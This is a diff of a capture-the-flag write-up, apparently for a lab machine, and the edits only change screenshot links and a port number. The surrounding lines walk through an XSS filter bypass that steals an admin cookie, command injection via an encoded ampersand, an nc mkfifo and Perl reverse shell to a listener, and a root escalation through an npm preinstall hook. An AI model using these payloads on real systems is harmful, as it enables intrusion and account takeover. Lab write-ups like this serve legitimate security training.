@@ -103,7 +103,7 @@ Login with this user. It seems to be a booking website.
 
 Click any booking and see the booking details. It consits of two tabs, including View and Notes. In the Notes, one word is interesting: "All notes must be approved by an administrator - this process can take up to 1 minute." Administrator is always attractive to hackers. It seems that the note will be approved by administrator. So it's possible to steal the session cokie of administrator if there is a xss vulnerability in the note edit form. I think it's the hardest part of this box. It's not easy to find the approprivate pass way. There is a way to utilize `fromCharCode` and other skills to pass the xss filter. The following javascript code is utilized to generate the payload:
 
-![EjjOxK.png](https://s2.ax1x.com/2019/05/19/EjjOxK.png)
+![notes](https://s2.ax1x.com/2019/05/19/Ej4oE8.png)
 
 ```javascript
 var url = 'http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65';
@@ -126,7 +126,7 @@ Set kali listen to port 80: `nc -lvnp 80`. The code can be run in the chrome dev
 
 The cookie of the administrator is obtained which is html encoded. Decode it with burp. And chage the cookie in the storage of firefox. Refesh the web page. Now you can hijack the administrator session cookie. Access to `http://10.10.10.25:8000/admin`. There seems nothing special except two buttons, including: Booking and Notes. 
 
-![Ej4oE8.png](https://s2.ax1x.com/2019/05/19/Ej4oE8.png)
+![EjjOxK.png](https://s2.ax1x.com/2019/05/19/EjjOxK.png)
 
 After some exploration, you will find that there are command injection in the two function url. You can try to access `http://10.10.10.25:8000/admin/export?table=notes%26ls`. You can found the directories in the exported file. One thing should be noticed, as `&` has been prohibited. So you can pass this by `%26`. Hence, it seems that the table name exits RCE. But it's limited to charaters, numbers and `/`. So you should try to RCE by these. It's not possible to use command to obtain reverse shell by command. For example, `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`. As many characters is not allowed.
 
@@ -197,7 +197,7 @@ Create the `package.json` and upload it to the target directory. `preinstall` ca
 use Socket;$i="10.10.16.65";$p=3344;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
 ```
 
-Set kali listen to port 33444: `nc -lvnp 3344`. In the victim, execute by: `sudo npm i rimrafall`. Now, we are root!
+Set kali listen to port 3344: `nc -lvnp 3344`. In the victim, execute by: `sudo npm i rimrafall`. Now, we are root!
 
 ![EvqfaR.png](https://s2.ax1x.com/2019/05/20/EvqfaR.png)
 
